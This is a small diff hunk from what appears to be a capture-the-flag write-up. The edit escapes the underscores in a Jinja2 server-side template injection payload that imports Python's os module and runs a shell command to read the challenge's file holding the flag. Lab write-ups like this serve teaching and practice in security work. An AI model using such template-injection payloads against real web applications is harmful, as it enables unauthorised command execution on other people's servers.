@@ -52,7 +52,7 @@ _I think that's where the flag is. I just need to see the text inside._
 
 Which is exactly what I did. I ran this command into the input:
 
-{{request.application.__globals__.__builtins__.__import__('os').popen('strings challenge.yml').read()}}
+{{request.application.\_\_globals\_\_.\_\_builtins\_\_.\_\_import\_\_('os').popen('strings challenge.yml').read()}}
 
 And poof, just like magic:
 
